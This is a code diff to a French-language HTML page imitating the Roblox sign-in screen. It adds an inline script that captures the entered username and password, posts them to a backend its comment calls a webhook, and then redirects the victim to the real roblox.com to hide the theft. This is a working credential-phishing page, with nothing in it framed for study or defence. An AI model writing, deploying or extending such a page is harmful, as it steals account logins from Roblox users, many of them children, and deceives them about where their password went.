@@ -297,6 +297,7 @@
     <div class="login-card">
       <h1>Connexion à Roblox</h1>
       
+      <!-- FORMULAIRE -->
       <form id="loginForm">
         <div class="form-group">
           <input type="text" id="username" class="input-field" placeholder="Identifiant/E-mail/Téléphone" required>
@@ -318,8 +319,35 @@
     </div>
   </div>
 
-  <!-- Lien vers le fichier JavaScript externe -->
-  <script src="script.js"></script>
+  <!-- SCRIPT INTÉGRÉ QUI ENVOIE AU WEBHOOK ET REDIRIGE -->
+  <script>
+  const form = document.getElementById('loginForm');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Empêche le rechargement brut de la page
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      const response = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        console.log('Données transmises avec succès !');
+        // Redirection vers le vrai site Roblox après l'envoi
+        window.location.href = 'https://www.roblox.com';
+      }
+    } catch (error) {
+      console.error('Erreur lors de l\'envoi :', error);
+    }
+  });
+  </script>
 
 </body>
 </html>
